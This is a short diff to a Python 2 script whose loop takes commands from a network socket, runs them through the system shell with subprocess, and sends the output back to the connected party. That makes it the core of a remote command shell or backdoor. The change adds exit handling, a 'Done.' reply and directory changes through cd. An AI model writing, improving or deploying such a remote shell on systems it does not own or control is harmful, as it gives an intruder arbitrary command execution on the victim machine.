@@ -30,8 +30,13 @@ while 1:
         break
     if data == "exit":
         conn.sendall(data)
+        break
     try:
         out = subprocess.check_output(data, stderr=subprocess.STDOUT, shell=True)
+        if not out:
+            out = "Done."
+        if data.split()[0] == "cd":
+            os.chdir(data.split()[1])
     except Exception, e:
         out = str(e.output)
     conn.sendall(out)
